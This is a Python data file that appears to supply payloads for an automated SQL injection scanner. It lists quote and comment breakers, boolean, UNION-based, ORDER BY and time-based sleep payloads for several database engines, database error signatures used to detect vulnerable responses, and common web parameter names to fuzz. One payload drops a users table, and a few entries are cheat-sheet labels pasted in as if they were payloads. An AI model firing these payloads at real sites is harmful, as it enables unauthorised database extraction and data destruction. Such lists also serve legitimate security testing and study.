import random

payloads_quotes = ["\"","'"]

payloads_comments = [
    "--",
    "-- -",
    "#",
    ";"
]

BlindTrue = [
    "AND 1=1",
]

BlindFalse = [
    "AND 1=2"
]

boolean_based_payloads = [
        "' OR '1'='1'",
        "' OR '1'='1' --",
        "'; DROP TABLE users; --"
    ]



time_based_payloads = [
    "SELECT SLEEP(2)",          # MySQL
    "SELECT PG_SLEEP(2)",       # PostGreSQL
    "WAITFOR DELAY '00:00:01'", # MSSQL
    "sqlite3_sleep(2000)"       # SQLite3
]

errors_msgs = [
    # ======== SQLite3 ========
    "<b>Warning</b>:  SQLite3",
    "unrecognized token:",
    "Unable to prepare statement:",
    # ======== MySQL =========
    "You have an error in your SQL",
    "MySQL server version for the right syntax",
    "supplied argument is not a valid MySQL result resource",
    # ======== PostgreSQL ========
    "ERROR:  syntax error",
    # ======== normal errors ========
    'SQL syntax error',
    'MySQL error',
    'SQLServer error'
]

payloads = [
    "'",
    "''",
    "`",
    "``",
    ",",
    "\"",
    "\"\"",
    "/",
    "//",
    "\\",
    "\\\\",
    ";",
    "' or \"",
    "-- or #",
    "' OR '1",
    "' OR 1 -- -",
    "\" OR \"\" = \"",
    "\" OR 1 = 1 -- -",
    "' OR '' = '",
    "'='",
    "'LIKE'",
    "'=0--+",
    " OR 1=1",
    "' OR 'x'='x",
    "' AND id IS NULL; --",
    "'''''''''''''UNION SELECT '2",
    "%00",
    "/*…*/",
    "+",
    "||",
    "%",
    "@variable",
    "@@variable",
    "# Numeric",
    "AND 1",
    "AND 0",
    "AND true",
    "AND false",
    "1-false",
    "1-true",
    "1*56",
    "-2",
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",
    "1' ORDER BY 1,2--+",
    "1' ORDER BY 1,2,3--+",
    "1' GROUP BY 1,2,--+",
    "1' GROUP BY 1,2,3--+",
    "' GROUP BY columnnames having 1=1 --",
    "-1' UNION SELECT 1,2,3--+",
    "' UNION SELECT sum(columnname ) from tablename --",
    "-1 UNION SELECT 1 INTO @,@",
    "-1 UNION SELECT 1 INTO @,@,@",
    "1 AND (SELECT * FROM Users) = 1",
    "' AND MID(VERSION(),1,1) = '5';",
    "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
    "Finding the table name",
    "Time-Based: ,(select * from (select(sleep(10)))a)",
    "%2c(select%20*%20from%20(select(sleep(10)))a)",
    "';WAITFOR DELAY '0:0:30'--",
    "Comments: # Hash comment /* C-style comment -- - SQL comment ;%00 Nullbyte ` Backtick"
]

params = [
    "id",
    "username",
    "password",
    "email",
    "phone",
    "address",
    "city",
    "state",
    "zip",
    "country",
    "firstname",
    "lastname",
    "name",
    "title",
    "description",
    "category",
    "tags",
    "search",
    "sort",
    "order",
    "limit",
    "offset",
    "page",
    "lang",
    "currency",
    "price",
    "quantity",
    "action",
    "submit",
    "token",
    "user_id",
    "user_name",
    "user_email",
    "user_phone",
    "user_address",
    "user_city",
    "user_state",
    "user_zip",
    "user_country",
    "user_firstname",
    "user_lastname",
    "product_id",
    "product_name",
    "product_description",
    "product_category",
    "product_tags",
    "product_price",
    "product_quantity",
    "order_id",
    "order_user_id",
    "order_product_id",
    "order_quantity",
    "order_price",
    "order_status",
    "review_id",
    "review_user_id",
    "review_product_id",
    "review_rating",
    "review_comment",
    "review_status",
    "blog_id",
    "blog_title",
    "blog_content",
    "blog_category",
    "blog_tags",
    "blog_status",
    "comment_id",
    "comment_user_id",
    "comment_blog_id",
    "comment_content",
    "comment_status",
    "setting_id",
    "setting_site_name",
    "setting_site_description",
    "setting_site_url",
    "setting_site_logo",
    "setting_site_favicon",
    "setting_site_theme"
    ]